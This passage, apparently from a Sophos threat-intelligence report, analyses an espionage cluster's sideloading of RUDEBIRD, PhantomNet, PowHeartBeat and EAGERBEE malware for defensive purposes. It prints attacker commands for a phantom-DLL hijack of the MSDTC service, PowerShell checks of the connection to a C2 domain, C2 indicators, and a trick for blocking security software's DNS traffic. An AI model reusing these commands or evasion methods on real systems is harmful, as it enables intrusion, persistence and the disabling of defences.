<p>Sophos Labs analysis revealed<strong> SHFOLDER.dll </strong>to have a DLL export name of <strong>mfcexport.dll</strong>, which appears to be unique to this malware, with the export <strong>SHGetFolderPathW </strong>function. Interestingly, the <strong>SHGetFolderPathW </strong>function in <strong>SHFOLDER.dll</strong> only runs to invoke the <strong>InitGadgets </strong>export in the malicious <strong>vmnat.dll</strong>, leading to a high confidence assessment that <strong>SHFOLDER.dll</strong> is used to intercept legitimate API calls (shim) and redirect them to the malicious DLL.</p>
<p>Once invoked, <strong>vmnat.dll</strong> uses <strong>InitGadgets </strong>to call the <strong>setDesktopMonitorHook </strong>function, which establishes communications with the domain <strong>cloud.keepasses[.]com</strong> before decoding additional payloads into memory. Near the end of the <strong>vmnat.dll</strong> file, the C2 URL is appended with a time value (<strong>https://cloud.keepasses[.]com:443;29s</strong>) in a configuration block encrypted with DES CBC encryption with the start marker <strong>“0x5345?”</strong>. It also contains both the Go implementation of OpenSSL and its own custom DES decryptor (one in common use in China), even though the included Go SSL libraries contain their own DES decryptor.</p>
<figure id="attachment_955528" aria-describedby="caption-attachment-955528" style="width: 640px" class="wp-caption alignnone"><a href="https://news.sophos.com/wp-content/uploads/2024/05/Slide7_99c5b8.jpeg"><img loading="lazy" decoding="async" class="wp-image-955528 size-full" src="https://news.sophos.com/wp-content/uploads/2024/05/Slide7_99c5b8.jpeg" alt="Figure 4: Diagram showing deployment and execution of Merlin C2 Agent" width="640" height="360" srcset="https://news.sophos.com/wp-content/uploads/2024/05/Slide7_99c5b8.jpeg 1200w, https://news.sophos.com/wp-content/uploads/2024/05/Slide7_99c5b8.jpeg?resize=300,169 300w, https://news.sophos.com/wp-content/uploads/2024/05/Slide7_99c5b8.jpeg?resize=768,432 768w, https://news.sophos.com/wp-content/uploads/2024/05/Slide7_99c5b8.jpeg?resize=1024,576 1024w" sizes="(max-width: 640px) 100vw, 640px" /></a><figcaption id="caption-attachment-955528" class="wp-caption-text">Figure 4: Diagram showing deployment and execution of Merlin C2 Agent</figcaption></figure>
<h4>Attempted deployment of suspected Quarian backdoor loader</h4>
<p>In April, the actor was observed exploiting the legitimate executable <strong>mobpopup.exe</strong> (renamed <strong>winsecunicity.exe</strong>) to sideload a malicious DLL (<strong>pc2msupp.dll)</strong>. This deployment technique also resembles a process outlined in the same <a href="https://www.bitdefender.com/files/News/CaseStudies/study/426/Bitdefender-PR-Whitepaper-BackdoorDiplomacy-creat6507-en-EN.pdf">BitDefender</a> report on Backdoor Diplomacy to sideload the Quarian backdoor. However, since the Sophos endpoint protection agent deleted the malicious files prior to execution, we are unable to confirm whether the Quarian backdoor was the intended final payload.</p>
<h4>RUDEBIRD / Impersoni-Fake-Ator Malware</h4>
<p>Two days after the attempted Quarian sideload, Sophos MDR hunters observed the actor execute a malware embedded in a legitimate version of the SysInternals ZoomIt Screen Magnifier Utility. In analyzing this sample, Sophos Labs found notable overlap with two publicly reported malware families that also embed themselves in legitimate applications: <a href="https://www.elastic.co/security-labs/introducing-the-ref5961-intrusion-set">RUDEBIRD</a> and <a href="https://www.bitdefender.com/files/News/CaseStudies/study/426/Bitdefender-PR-Whitepaper-BackdoorDiplomacy-creat6507-en-EN.pdf">Impersoni-Fake-Ator</a>.</p>
<p>To deploy the malware, the actor overwrote the beginning code section in a valid Sysinternals executable with malicious code. Executed as <strong>‘C:\Windows\SysWOW64\setup\MSI64.EXE’, </strong>the recovered malware is a highly obfuscated sample capable of <a href="https://blog.christophetd.fr/hiding-windows-api-imports-with-a-customer-loader/">dynamically parsing</a> the Process Environment Block (PEB) to stealthily resolve Windows API functions. It uses an API hashing algorithm of <a href="https://github.com/OALabs/hashdb/blob/main/algorithms/mult21_add.py">‘<strong>Multiply 0x21 and ADD</strong>&#8216;</a> to obfuscate which Windows API calls it is attempting to resolve and execute.</p>
<figure id="attachment_955529" aria-describedby="caption-attachment-955529" style="width: 640px" class="wp-caption alignnone"><a href="https://news.sophos.com/wp-content/uploads/2024/05/RUDEBIRD-MSI64.exe-API-hashing-algorithm.png"><img loading="lazy" decoding="async" class="wp-image-955529 size-full" src="https://news.sophos.com/wp-content/uploads/2024/05/RUDEBIRD-MSI64.exe-API-hashing-algorithm.png" alt="A screenshot of the API hashing function of RUDEBIRD malware sample (MSI64.exe)" width="640" height="388" srcset="https://news.sophos.com/wp-content/uploads/2024/05/RUDEBIRD-MSI64.exe-API-hashing-algorithm.png 1193w, https://news.sophos.com/wp-content/uploads/2024/05/RUDEBIRD-MSI64.exe-API-hashing-algorithm.png?resize=300,182 300w, https://news.sophos.com/wp-content/uploads/2024/05/RUDEBIRD-MSI64.exe-API-hashing-algorithm.png?resize=768,466 768w, https://news.sophos.com/wp-content/uploads/2024/05/RUDEBIRD-MSI64.exe-API-hashing-algorithm.png?resize=1024,621 1024w" sizes="(max-width: 640px) 100vw, 640px" /></a><figcaption id="caption-attachment-955529" class="wp-caption-text">Figure 5: RUDEBIRD (MSI64.exe) API hashing algorithm</figcaption></figure>
<p>The payload in <strong>MSI64.exe</strong> is compressed with LZNT1 and staged in separate XOR-encoded blobs. The first blob is a configuration containing two to C2 IPs (<strong>195.123.247[.]50</strong> and <strong>185.195.237[.]123</strong>); the other is the shellcode of the final payload that’s decompressed using the dynamically resolved <strong>RtlDecompressBuffer </strong>API and executed. Reverse engineering of the shellcode revealed many of the payload’s functions, such as:</p>
<figure id="attachment_955530" aria-describedby="caption-attachment-955530" style="width: 472px" class="wp-caption alignnone"><a href="https://news.sophos.com/wp-content/uploads/2024/05/Sample-of-reverse-engineered-MSI64.exe-functions.png"><img loading="lazy" decoding="async" class="size-full wp-image-955530" src="https://news.sophos.com/wp-content/uploads/2024/05/Sample-of-reverse-engineered-MSI64.exe-functions.png" alt="" width="472" height="1251" srcset="https://news.sophos.com/wp-content/uploads/2024/05/Sample-of-reverse-engineered-MSI64.exe-functions.png 472w, https://news.sophos.com/wp-content/uploads/2024/05/Sample-of-reverse-engineered-MSI64.exe-functions.png?resize=113,300 113w, https://news.sophos.com/wp-content/uploads/2024/05/Sample-of-reverse-engineered-MSI64.exe-functions.png?resize=386,1024 386w" sizes="(max-width: 472px) 100vw, 472px" /></a><figcaption id="caption-attachment-955530" class="wp-caption-text">Figure 6: Sample of reverse engineered MSI64.exe functions</figcaption></figure>
<p>The <strong>MSI64.exe</strong> sample contains the same publicly available API hashing algorithm, mutex creation of ‘VV.0’, and C2 IP <strong>185.195.237[.]123</strong> as RUDEBIRD malware detailed by <a href="https://www.elastic.co/security-labs/introducing-the-ref5961-intrusion-set">Elastic</a>. However, reverse engineering of the sample also revealed the C2 command functionality to overlap with documented C2 commands in Impersoni-Fake-Ator malware detailed by <a href="https://www.bitdefender.com/files/News/CaseStudies/study/426/Bitdefender-PR-Whitepaper-BackdoorDiplomacy-creat6507-en-EN.pdf">BitDefender.</a> Our analysis of the available data leads us to believe that the RUDEBIRD and Impersoni-Fake-Ator malware families are quite similar, or potentially even the same. As such,  it is very likely that the <strong>MSI64.exe</strong> sample leveraged in this campaign was a novel variant of one or both malware families.</p>
<figure id="attachment_955531" aria-describedby="caption-attachment-955531" style="width: 640px" class="wp-caption alignnone"><a href="https://news.sophos.com/wp-content/uploads/2024/05/Reverse-Engineered-Section-of-MSI64_exe-showing-functionality-of-C2-commands.png"><img loading="lazy" decoding="async" class="size-full wp-image-955531" src="https://news.sophos.com/wp-content/uploads/2024/05/Reverse-Engineered-Section-of-MSI64_exe-showing-functionality-of-C2-commands.png" alt="" width="640" height="460" srcset="https://news.sophos.com/wp-content/uploads/2024/05/Reverse-Engineered-Section-of-MSI64_exe-showing-functionality-of-C2-commands.png 1490w, https://news.sophos.com/wp-content/uploads/2024/05/Reverse-Engineered-Section-of-MSI64_exe-showing-functionality-of-C2-commands.png?resize=300,215 300w, https://news.sophos.com/wp-content/uploads/2024/05/Reverse-Engineered-Section-of-MSI64_exe-showing-functionality-of-C2-commands.png?resize=768,552 768w, https://news.sophos.com/wp-content/uploads/2024/05/Reverse-Engineered-Section-of-MSI64_exe-showing-functionality-of-C2-commands.png?resize=1024,735 1024w" sizes="(max-width: 640px) 100vw, 640px" /></a><figcaption id="caption-attachment-955531" class="wp-caption-text">Figure 7: Reverse engineered section of <strong>MSI64.exe</strong> showing functionality of received C2 commands</figcaption></figure>
<h4>Endpoint protection vendor software abuses</h4>
<p>Throughout the campaign, the actor in Cluster Alpha frequently abused endpoint protection software binaries to sideload their malicious payloads. In April, Sophos hunters observed an unsuccessful attempt to sideload a malicious DLL (<strong>mpclient.dll</strong>) by executing a Microsoft signed binary part of Windows Defender (<strong>MpUXsrv.exe</strong>), but the payload had already been deleted by Sophos endpoint protection.</p>
<p>A few months later, the actor exploited an application associated with the Chinese malware protection software company Beijing Huorong Network Technology Co. called <strong>usysdiag.exe</strong> (renamed <strong>ph.exe</strong>) to sideload a malicious DLL (<strong>SensAPI.dll). </strong>Upon execution, <strong>ph.exe</strong> sideloaded SensAPI.dll and spawned dllhost.exe, which made an outbound connection to attacker IP <strong>139.162.18[.]97 </strong>before deleting <strong>ph.exe</strong> and <strong>SensAPI.dll</strong> within five minutes. This left a C2 session to the attacker IP spawned into <strong>dllhost.exe </strong>that was flagged by Sophos detection <strong>EQL-WIN-EXE-PRC-PERFLOGS-1</strong>.</p>
<h4>Loading PhantomNet</h4>
<p>Sophos observed three different samples of the PhantomNet backdoor in Cluster Alpha, which were loaded onto systems at different times under the file names: <strong>sslwnd64.exe</strong>; <strong>oci.dll</strong>; and <strong>nethood.exe</strong>. <a href="https://www.welivesecurity.com/2020/12/17/operation-signsight-supply-chain-attack-southeast-asia/">PhantomNet</a> (aka <a href="https://jp.security.ntt/tech_blog/102glv5">SManager</a>, <a href="https://www.elastic.co/security-labs/introducing-the-ref5961-intrusion-set">DOWNTOWN</a>) is a simple backdoor capable of collecting victim information and installing malicious plugins that has been previously attributed to Chinese APT TA428.</p>
<p>Throughout the intrusion, the actor in Cluster Alpha leveraged the PhantomNet implants, particularly the <strong>sslwnd64.exe</strong> sample, to establish C2 communications and load additional payloads. All three samples have similar code and embedded OpenSSL components, and their configurations and the paths of their program database (PDB, used for debugging information) resemble a PhantomNet sample reported by <a href="https://twitter.com/GroupIB_TI/status/1666103950896947201">Group-IB Threat Intelligence</a> in June 2023.</p>
<p><strong>Oci.dll PDB path:</strong></p>
<pre>E:\2023 LTL\2023DM\20221206NewWakeUp_V4.0\_OUT\LoadWin32_x64.pdb</pre>
<p><strong>Sslwnd64.dll &amp; nethood.dll PDB path:</strong></p>
<pre>E:\20220501\TTT_SharpArrow 7.4\2022LTL\20220618\20220915NewWakeUp_V1.0\_OUT\LoadWin32_x64.pdb</pre>
<p><figure id="attachment_955532" aria-describedby="caption-attachment-955532" style="width: 640px" class="wp-caption alignnone"><a href="https://news.sophos.com/wp-content/uploads/2024/05/sslwnd64.exe-configuration.png"><img loading="lazy" decoding="async" class="wp-image-955532 size-full" src="https://news.sophos.com/wp-content/uploads/2024/05/sslwnd64.exe-configuration.png" alt="PhantomNet sample (sslwnd64.exe) configuration containing C2 IPs associate.feedfoodconcerning[.]info &amp; associate.freeonlinelearningtech[.]com" width="640" height="318" srcset="https://news.sophos.com/wp-content/uploads/2024/05/sslwnd64.exe-configuration.png 693w, https://news.sophos.com/wp-content/uploads/2024/05/sslwnd64.exe-configuration.png?resize=300,149 300w" sizes="(max-width: 640px) 100vw, 640px" /></a><figcaption id="caption-attachment-955532" class="wp-caption-text">Figure 8: PhantomNet sample (<strong>sslwnd64.exe) </strong>configuration containing C2 IPs associate.feedfoodconcerning[.]info &amp; associate.freeonlinelearningtech[.]com</figcaption></figure>Analysis by Sophos Labs revealed the backdoor samples contain zlib-compressed OpenSSL DLLs in the resource directory <strong>TTT</strong>, with an RC4 encrypted config block using the key <strong>‘L!Q@W#E$R%T^Y&amp;U*A|}t~k’</strong>. The main loader decrypts and loads the DLL payload before calling the ‘<strong>Start’ </strong>export that passes the encrypted configuration address to enable C2 communications.</p>
<figure id="attachment_955533" aria-describedby="caption-attachment-955533" style="width: 640px" class="wp-caption alignnone"><a href="https://news.sophos.com/wp-content/uploads/2024/05/Loading-and-execution-of-PhantomNet-sslwnd64.exe_.png"><img loading="lazy" decoding="async" class="wp-image-955533 size-full" src="https://news.sophos.com/wp-content/uploads/2024/05/Loading-and-execution-of-PhantomNet-sslwnd64.exe_.png" alt="Reverse engineered code block showing decryption and loading of PhantomNet DLL payload and calling ‘Start’ export" width="640" height="315" srcset="https://news.sophos.com/wp-content/uploads/2024/05/Loading-and-execution-of-PhantomNet-sslwnd64.exe_.png 1031w, https://news.sophos.com/wp-content/uploads/2024/05/Loading-and-execution-of-PhantomNet-sslwnd64.exe_.png?resize=300,148 300w, https://news.sophos.com/wp-content/uploads/2024/05/Loading-and-execution-of-PhantomNet-sslwnd64.exe_.png?resize=768,378 768w, https://news.sophos.com/wp-content/uploads/2024/05/Loading-and-execution-of-PhantomNet-sslwnd64.exe_.png?resize=1024,505 1024w" sizes="(max-width: 640px) 100vw, 640px" /></a><figcaption id="caption-attachment-955533" class="wp-caption-text">Figure 9: Reversed PhantomNet (sslwnd64.exe) sample code block showing decryption and loading of the PhantomNet DLL payload and calling ‘Start’ export</figcaption></figure>
<h4>Oci.dll PhantomNet Variant</h4>
<p>The <strong>oci.dll </strong>variant has one difference: it can be potentially used in DLL sideloading, as it impersonates <strong>explorerframe.dll </strong>with its forwarded exports.</p>
<figure id="attachment_955534" aria-describedby="caption-attachment-955534" style="width: 640px" class="wp-caption alignnone"><a href="https://news.sophos.com/wp-content/uploads/2024/05/Oci.dll-forwarder-exports.png"><img loading="lazy" decoding="async" class="wp-image-955534 size-full" src="https://news.sophos.com/wp-content/uploads/2024/05/Oci.dll-forwarder-exports.png" alt="PhantomNet malware sample (oci.dll) forwarder exports" width="640" height="133" srcset="https://news.sophos.com/wp-content/uploads/2024/05/Oci.dll-forwarder-exports.png 1416w, https://news.sophos.com/wp-content/uploads/2024/05/Oci.dll-forwarder-exports.png?resize=300,62 300w, https://news.sophos.com/wp-content/uploads/2024/05/Oci.dll-forwarder-exports.png?resize=768,159 768w, https://news.sophos.com/wp-content/uploads/2024/05/Oci.dll-forwarder-exports.png?resize=1024,213 1024w" sizes="(max-width: 640px) 100vw, 640px" /></a><figcaption id="caption-attachment-955534" class="wp-caption-text">Figure 10: PhantomNet malware sample (oci.dll) forwarder exports</figcaption></figure>
<h4></h4>
<p>In deploying the oci.dll sample, the actor created a SOCKS proxy to be used by the Microsoft Distributed Transaction Coordinator (MSDTC) service but struggled to sideload the malicious DLL as it was moved to the incorrect Windows directory for MSDTC.exe to map it. Despite this, the actor succeeded in sideloading <strong>oci.dll</strong> on other servers, and Sophos observed the SOCKS proxy connecting to several attacker C2s a month later: <strong>104.21.3[.]57</strong>;<strong> 172.67.130[.]71; 185.82.217[.]164;</strong> <strong>195.123.245[.]79</strong>.</p>
<p>The actor was then seen attempting a known DLL hijacking technique, <a href="https://hijacklibs.net/entries/microsoft/built-in/oci.html">phantom DLL sideloading</a>. By placing the malicious oci.dll in a location read by the MSDTC service’s executable—a location the file does not usually occur in—the malicious code was called when the service was stopped and restarted from a local SYSTEM account.</p>
<pre>cmd /c move oci.dll c:\windows\system32\
net stop msdtc
sc config msdtc obj= LocalSystem
net start msdtc</pre>
<p>Sophos MDR also observed the actor using valid accounts to create <strong>sslwnd64.exe </strong>and execute the backdoor to establish C2 communications to attacker IP <strong>185.167.116[.]30</strong>, which was also used as C2 for the actor’s RUDEBIRD malware.</p>
<h4>PowHeartBeat backdoor</h4>
<p>Around the same time, the threat actor in Cluster Alpha used different techniques to deploy the PowHeartBeat backdoor and establish brief connections to <strong>msudapis[.]info</strong>, now known to be an exfiltration domain<strong>. </strong><a href="https://www.welivesecurity.com/2022/09/06/worok-big-picture/">PowHeartBeat</a> is a full-featured PowerShell backdoor containing various layers of obfuscated code masking the backdoor functionality.</p>
<p><a style="font-size: 1em" href="https://news.sophos.com/wp-content/uploads/2024/05/Slide8.jpeg"><img loading="lazy" decoding="async" class="wp-image-955390 size-full" src="https://news.sophos.com/wp-content/uploads/2024/05/Slide8.jpeg" alt="Diagram showing different techniques used to deploy the PowHeartBeat backdoor" width="640" height="360" srcset="https://news.sophos.com/wp-content/uploads/2024/05/Slide8.jpeg 1200w, https://news.sophos.com/wp-content/uploads/2024/05/Slide8.jpeg?resize=300,169 300w, https://news.sophos.com/wp-content/uploads/2024/05/Slide8.jpeg?resize=768,432 768w, https://news.sophos.com/wp-content/uploads/2024/05/Slide8.jpeg?resize=1024,576 1024w" sizes="(max-width: 640px) 100vw, 640px" /></a></p>
<p>Figure 11:Diagram showing different techniques used to deploy the PowHeartBeat backdoorIn the first instance, VMNat.exe was seen spawning a command session that executed <strong>‘C:\ProgramData\Microsoft\Vault\1.bat</strong>’ and ran a PowerShell script (<strong>1.ps1</strong>) containing the PowHeartBeat backdoor code. The script executes to connect to <strong>msudapis[.]info</strong> over port 443, compiling <strong>‘C:\Windows\Temp\ba0oddof\ba0oddof.dll’</strong> and continuing network communications for 24 hours.</p>
<pre>C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe" /noconfig /fullpaths @"C:\Windows\TEMP\ba0oddof\ba0oddof.cmdline" &gt;&gt; C:\Windows\Microsoft.NET\Framework\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 "/OUT:C:\Windows\TEMP\RESC412.tmp" "c:\Windows\Temp\ba0oddof\CSC3B1CFE4783554F8C923D8821BA1B281A.TMP"</pre>
<p>Two weeks later, Sophos MDR hunters observed VMNat launch a PowerShell TCP listener for the same domain (<strong>msudapis[.]info</strong>) in a likely attempt to check the C2 connection, before immediately executing the file <strong>SophosUD.exe </strong>containing a PowHeartBeat backdoor implant.</p>
<pre>cmd /c powersh ||| ell -e &lt;Encoded PowerShell&gt; [443 | % {echo ((new-object Net.Sockets.TcpClient).Connect(&amp;quot;www.msudapis.info&amp;quot;,$_)) $_&amp;quot; is open!&amp;quot;} 2&amp;gt;$null]</pre>
<p>In this instance, instead of executing the PowerShell script directly, the actors used a .NET executable obfuscated using Reactor (<strong>SophosUD.exe</strong>) as a loader for an AES-encrypted PowerShell script, which exhibited the same capabilities, CSC compilation, and outbound domain as the <strong>1.ps1</strong> script run two weeks before. Upon execution, the backdoor generated direct IP communications to<strong> 154.39.137[.]29</strong> (hosting the domain <strong>msudapis[.]info</strong>) before being killed approximately 11 minutes later, as well as executed a CSC compilation that created <strong>pdzaix2o.dll</strong>.</p>
<pre>"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe" /noconfig /fullpaths @"C:\Windows\TEMP\pdzaix2o\pdzaix2o.cmdline" &gt;&gt; C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 "/OUT:C:\Windows\TEMP\RES36E9.tmp" "c:\Windows\Temp\pdzaix2o\CSCEA37B09CA2D74FFF8466F6A728682F11.TMP"</pre>
<p>Sophos Labs implemented detections Troj/PwrHBeat-A and Troj/PowerSh-J to detect this malicious behavior.</p>
<div class="mceTemp"></div>
<figure id="attachment_955537" aria-describedby="caption-attachment-955537" style="width: 1574px" class="wp-caption alignnone"><a href="https://news.sophos.com/wp-content/uploads/2024/05/Decoded-Main-Function.jpg"><img loading="lazy" decoding="async" class="wp-image-955537 size-full" src="https://news.sophos.com/wp-content/uploads/2024/05/Decoded-Main-Function.jpg" alt="" width="1574" height="889" srcset="https://news.sophos.com/wp-content/uploads/2024/05/Decoded-Main-Function.jpg 1574w, https://news.sophos.com/wp-content/uploads/2024/05/Decoded-Main-Function.jpg?resize=300,169 300w, https://news.sophos.com/wp-content/uploads/2024/05/Decoded-Main-Function.jpg?resize=768,434 768w, https://news.sophos.com/wp-content/uploads/2024/05/Decoded-Main-Function.jpg?resize=1024,578 1024w, https://news.sophos.com/wp-content/uploads/2024/05/Decoded-Main-Function.jpg?resize=1536,868 1536w" sizes="(max-width: 1574px) 100vw, 1574px" /></a><figcaption id="caption-attachment-955537" class="wp-caption-text">Figure 12: Decoded Main Function of SophosUD.exe (Decompiled C# Code of SophosUD.exe)</figcaption></figure>
<figure id="attachment_955538" aria-describedby="caption-attachment-955538" style="width: 640px" class="wp-caption alignnone"><a href="https://news.sophos.com/wp-content/uploads/2024/05/SophosUD.exe-Decoded-PowerShell-Script.png"><img loading="lazy" decoding="async" class="wp-image-955538 size-full" src="https://news.sophos.com/wp-content/uploads/2024/05/SophosUD.exe-Decoded-PowerShell-Script.png" alt="Figure 13: SophosUD.exe Decoded PowerShell Script" width="640" height="487" srcset="https://news.sophos.com/wp-content/uploads/2024/05/SophosUD.exe-Decoded-PowerShell-Script.png 1143w, https://news.sophos.com/wp-content/uploads/2024/05/SophosUD.exe-Decoded-PowerShell-Script.png?resize=300,228 300w, https://news.sophos.com/wp-content/uploads/2024/05/SophosUD.exe-Decoded-PowerShell-Script.png?resize=768,584 768w, https://news.sophos.com/wp-content/uploads/2024/05/SophosUD.exe-Decoded-PowerShell-Script.png?resize=1024,779 1024w" sizes="(max-width: 640px) 100vw, 640px" /></a><figcaption id="caption-attachment-955538" class="wp-caption-text">Figure 13: SophosUD.exe Decoded PowerShell Script</figcaption></figure>
<p>Two months later, the actor attempted to drop another PowHeartBeat sample (<strong>SophosUD2.exe</strong>), but the binary was blocked by the Sophos agent under detection <strong>Mal/Generic-S</strong>. In this sample, the C2 IP <strong>147.139.47[.]141</strong> was found in the embedded base64 script of the backdoor.</p>
<h2 id="alpha-evasion">Defense Evasion</h2>
<h4>New Variants of EAGERBEE Malware</h4>
<p>While multiple evasion tactics were observed in Cluster Alpha, the most notable ones involved new variants of EAGERBEE, a Chinese-nexus malware first reported by <a href="https://www.elastic.co/security-labs/introducing-the-ref5961-intrusion-set">Elastic Security</a> in October 2023. Though Elastic noted the samples of EAGERBEE they observed had a low level of sophistication, the variants observed by Sophos indicate that the malware has been significantly upgraded. Specifically, the uncovered samples (TSVIPSrv.dll and wlbsctrl.dll) exhibited the new capability of modifying network packets to disable compromised systems from communicating with malware protection policy servers and cloud-based detection capabilities.</p>
<p>First loaded on the system in June by using <span class="ui-provider a b c d e f g h i j k l m n o p q r s t u v w x y z ab ac ae af ag ah ai aj ak" dir="ltr">phantom DLL hijacking</span>to infect the IKEEXT and SessionENV services, <strong>TSVIPSrv.dll </strong>and <strong>wlbsctrl.dll </strong>were identified by Sophos Labs to have significant structural overlaps with Elastic&#8217;s analysis on EAGERBEE, including:</p>
<ul>
<li>Matching IP:PORT structure</li>
<li>Same reference to <strong>mui </strong>containing the encrypted configuration</li>
<li>Same graphical error of <strong>‘DONNECT’ </strong>instead of <strong>‘CONNECT’ </strong>in the HTTP request string</li>
</ul>
<figure id="attachment_955539" aria-describedby="caption-attachment-955539" style="width: 640px" class="wp-caption alignnone"><a href="https://news.sophos.com/wp-content/uploads/2024/05/Iconcache-configuration-from-observed-TSVIPSrv.dll-sample.png"><img loading="lazy" decoding="async" class="wp-image-955539 size-full" src="https://news.sophos.com/wp-content/uploads/2024/05/Iconcache-configuration-from-observed-TSVIPSrv.dll-sample.png" alt="Figure 14: Iconcache configuration from observed TSVIPSrv.dll sample" width="640" height="420" srcset="https://news.sophos.com/wp-content/uploads/2024/05/Iconcache-configuration-from-observed-TSVIPSrv.dll-sample.png 923w, https://news.sophos.com/wp-content/uploads/2024/05/Iconcache-configuration-from-observed-TSVIPSrv.dll-sample.png?resize=300,197 300w, https://news.sophos.com/wp-content/uploads/2024/05/Iconcache-configuration-from-observed-TSVIPSrv.dll-sample.png?resize=768,504 768w" sizes="(max-width: 640px) 100vw, 640px" /></a><figcaption id="caption-attachment-955539" class="wp-caption-text">Figure 14: Iconcache configuration from observed TSVIPSrv.dll sample</figcaption></figure>
<figure id="attachment_955544" aria-describedby="caption-attachment-955544" style="width: 640px" class="wp-caption alignnone"><a href="https://news.sophos.com/wp-content/uploads/2024/05/Screenshot-of-EAGERBEE-malware-configuration-from-Elastic-Security-blog-Introducing-the-REF5961-Intrusion-Set.png"><img loading="lazy" decoding="async" class="wp-image-955544 size-full" src="https://news.sophos.com/wp-content/uploads/2024/05/Screenshot-of-EAGERBEE-malware-configuration-from-Elastic-Security-blog-Introducing-the-REF5961-Intrusion-Set.png" alt="Figure 15: Screenshot of EAGERBEE malware configuration from Elastic Security" width="640" height="156" srcset="https://news.sophos.com/wp-content/uploads/2024/05/Screenshot-of-EAGERBEE-malware-configuration-from-Elastic-Security-blog-Introducing-the-REF5961-Intrusion-Set.png 672w, https://news.sophos.com/wp-content/uploads/2024/05/Screenshot-of-EAGERBEE-malware-configuration-from-Elastic-Security-blog-Introducing-the-REF5961-Intrusion-Set.png?resize=300,73 300w" sizes="(max-width: 640px) 100vw, 640px" /></a><figcaption id="caption-attachment-955544" class="wp-caption-text">Figure 15: Screenshot of EAGERBEE malware configuration from Elastic Security</figcaption></figure>
<div class="mceTemp"></div>
<figure id="attachment_955543" aria-describedby="caption-attachment-955543" style="width: 640px" class="wp-caption alignnone"><a href="https://news.sophos.com/wp-content/uploads/2024/05/HTTP-Request-String-containing-DONNECT-typo-from-observed-TSVIPSrv.dll-sample-1.png"><img loading="lazy" decoding="async" class="wp-image-955543 size-full" src="https://news.sophos.com/wp-content/uploads/2024/05/HTTP-Request-String-containing-DONNECT-typo-from-observed-TSVIPSrv.dll-sample-1.png" alt="Figure 16: HTTP Request String containing DONNECT typo from observed TSVIPSrv.dll sample" width="640" height="177" srcset="https://news.sophos.com/wp-content/uploads/2024/05/HTTP-Request-String-containing-DONNECT-typo-from-observed-TSVIPSrv.dll-sample-1.png 804w, https://news.sophos.com/wp-content/uploads/2024/05/HTTP-Request-String-containing-DONNECT-typo-from-observed-TSVIPSrv.dll-sample-1.png?resize=300,83 300w, https://news.sophos.com/wp-content/uploads/2024/05/HTTP-Request-String-containing-DONNECT-typo-from-observed-TSVIPSrv.dll-sample-1.png?resize=768,212 768w" sizes="(max-width: 640px) 100vw, 640px" /></a><figcaption id="caption-attachment-955543" class="wp-caption-text">Figure 16: HTTP Request String containing DONNECT typo from observed TSVIPSrv.dll sample</figcaption></figure>
<figure id="attachment_955541" aria-describedby="caption-attachment-955541" style="width: 667px" class="wp-caption alignnone"><a href="https://news.sophos.com/wp-content/uploads/2024/05/Screenshot-of-EAGERBEE-HTTP-request-string-from-Elastic-Security-blog-Introducing-the-REF5961-Intrusion-Set-1.png"><img loading="lazy" decoding="async" class="wp-image-955541 size-full" src="https://news.sophos.com/wp-content/uploads/2024/05/Screenshot-of-EAGERBEE-HTTP-request-string-from-Elastic-Security-blog-Introducing-the-REF5961-Intrusion-Set-1.png" alt="Figure 17L: Screenshot of EAGERBEE HTTP request string from Elastic Security" width="667" height="260" srcset="https://news.sophos.com/wp-content/uploads/2024/05/Screenshot-of-EAGERBEE-HTTP-request-string-from-Elastic-Security-blog-Introducing-the-REF5961-Intrusion-Set-1.png 667w, https://news.sophos.com/wp-content/uploads/2024/05/Screenshot-of-EAGERBEE-HTTP-request-string-from-Elastic-Security-blog-Introducing-the-REF5961-Intrusion-Set-1.png?resize=300,117 300w" sizes="(max-width: 667px) 100vw, 667px" /></a><figcaption id="caption-attachment-955541" class="wp-caption-text">Figure 17: Screenshot of EAGERBEE HTTP request string from <a href="https://www.elastic.co/security-labs/introducing-the-ref5961-intrusion-set">Elastic Security</a></figcaption></figure>
<p>In each highly obfuscated DLL, the threat actor tried to hinder analysis by modifying parts of the PE (Portable Executable) header and using their own PE loader in the unpacker shellcode. The loader decompresses and executes the EAGERBEE payload, which installs two WinDivert binaries (<strong>WinDivert.DLL</strong> and <strong>WinDivert.sys</strong>).</p>
<p><a href="https://github.com/basil00/Divert">WinDivert</a> is a powerful user-mode package for Windows, including capture, modification, blocking, and re-injection capabilities. However, the deployed <strong>WinDivert.DLL </strong>contained an additional modification deviating from the original source code.</p>
<p>Upon execution, the WinDivert DLL creates a new thread to monitor outgoing traffic to UDP Port 53. To misguide analysts into thinking the malware filters UDP Port 5 traffic, the code contains the hardcoded string ‘<strong>udp.DstPort == 5’ </strong>but appends a ‘<strong>3’</strong> afterward to filter DNS traffic on Port 53.</p>
<figure id="attachment_955545" aria-describedby="caption-attachment-955545" style="width: 589px" class="wp-caption alignnone"><a href="https://news.sophos.com/wp-content/uploads/2024/05/Reverse-engineered-code-block-assembling-port-53-UDP-filter-and-calling-WinDivert.png"><img loading="lazy" decoding="async" class="size-full wp-image-955545" src="https://news.sophos.com/wp-content/uploads/2024/05/Reverse-engineered-code-block-assembling-port-53-UDP-filter-and-calling-WinDivert.png" alt="Reverse engineered code block assembling port 53 UDP filter and calling WinDivert" width="589" height="217" srcset="https://news.sophos.com/wp-content/uploads/2024/05/Reverse-engineered-code-block-assembling-port-53-UDP-filter-and-calling-WinDivert.png 589w, https://news.sophos.com/wp-content/uploads/2024/05/Reverse-engineered-code-block-assembling-port-53-UDP-filter-and-calling-WinDivert.png?resize=300,111 300w" sizes="(max-width: 589px) 100vw, 589px" /></a><figcaption id="caption-attachment-955545" class="wp-caption-text">Figure 18: Reverse engineered code block assembling port 53 UDP filter and calling WinDivert</figcaption></figure>
